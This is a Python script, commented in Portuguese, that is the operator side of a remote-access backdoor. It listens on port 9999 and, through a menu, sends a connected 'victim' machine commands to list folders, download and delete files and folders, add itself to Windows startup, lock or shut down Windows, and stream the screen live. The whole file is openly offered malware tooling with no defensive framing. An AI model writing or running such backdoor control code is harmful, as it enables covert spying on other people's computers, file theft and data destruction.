from vidstream import StreamingServer
import threading, socket, sys

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        print("=====================")
        print("1. Sair")
        print("2. Ver onde o backdoor esta localizado.")
        print("3. Ver pastas de um diretorio custumizado.")
        print("4. Baixar arquivo pelo Backdoor.")
        print("5. Deletar arquivo pelo Backdoor.")
        print("6. Deletar pasta pelo Backdoor.")
        print("7. Adicionar ao startup.")
        print("8. Remover do startup.")
        print("9. Lock Windows.")
        print("10. Shutdown Windows.")
        print("11. Ver tela em tempo real.")
        print("=====================")

        try:
            cmd = str(input("Digite a opção desejada:"))
            print(cmd)
        except:
            print("Por favor digite uma opção valida.")

        if cmd == '1':
            conn.close()
            s.close()
            sys.exit()

        elif cmd == '2':
            try:
                conn.send(cmd.encode())
                print("Comando foi executado com sucesso no servidor...")
                files = conn.recv(5000)
                files = files.decode()
                print("Output do comando: " + files)
            except:
                print("Erro ao executar o comando : ver_cwd, Server Error")

        elif cmd == '3':
            try:
                conn.send(cmd.encode())
                user_input = input(str("Diretorio custom: "))
                conn.send(user_input.encode())
                print("Comando foi enviado...")
                files = conn.recv(5000)
                files = files.decode()
                print("Diretorios: " + files)

            except:
                print("Erro ao executar o comando : ver_diretorios, Server Error")

        elif cmd == '4':
            try:
                conn.send(cmd.encode())
                filepath = input(str("Insira o caminho incluido o nome do arquivo: "))
                conn.send(filepath.encode())
                file = conn.recv(100000)
                filename = input(str("Insira um nome para o arquivo baixado: "))
                new_file = open(filename, 'wb')
                new_file.write(file)
                new_file.close()
                print(filename, " Foi criado com sucesso e salvo")
            except:
                print("Erro ao executar o comando : download, Server Error")

        elif cmd == '5':
            try:
                conn.send(cmd.encode())
                fileanddir = input(str("Digite o diretorio contendo o nome do arquivo a ser deletado: "))
                conn.send(fileanddir.encode())
                print("Arquivo foi deletado com sucesso.")
            except:
                print("Erro ao executar o comando : Remove file, Server Error")

        elif cmd == '6':
            try:
                conn.send(cmd.encode())
                fileanddir = input(str("Digite a pasta a ser deletado: "))
                conn.send(fileanddir.encode())
                print("Pasta foi deletado com sucesso.")
            except:
                print("Erro ao executar o comando : Remove file, Server Error")

        elif cmd == '7':

            try:
                conn.send(cmd.encode())
                print("Adicionado no startup")
            except:
                print("Erro ao executar o comando : Adicionar ao startup, Server Error")

        elif cmd == '8':

            try:
                conn.send(cmd.encode())
                print("Removido do startup")
            except:
                print("Erro ao executar o comando : Remove Startup, Server Error")

        elif cmd == '9':

            try:
                conn.send(cmd.encode())
                print("Sistema operaciona travado")
            except:
                print("Erro ao executar o comando: Lock Windows, Server Error")

        elif cmd == '10':

            try:
                conn.send(cmd.encode())
                print("Sistema operaciona desligado")
            except:
                print("Erro ao executar o comando: Shutdown Windows, Server Error")

        elif cmd == '11':

            try:
                conn.send(cmd.encode())

                receiver = StreamingServer(local_ip, 9999)
                t = threading.Thread(target=receiver.start_server)
                t.start()

                print("Compartilhando a tela")

                while input("Digite (sair) para cancelar do compartilhamento: ") != 'sair':
                    continue

                receiver.stop_server()
                parar = True
                conn.send(parar.encode())

            except:
                print("Erro ao executar o comando: Compartilhamento de tela, Server Error")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
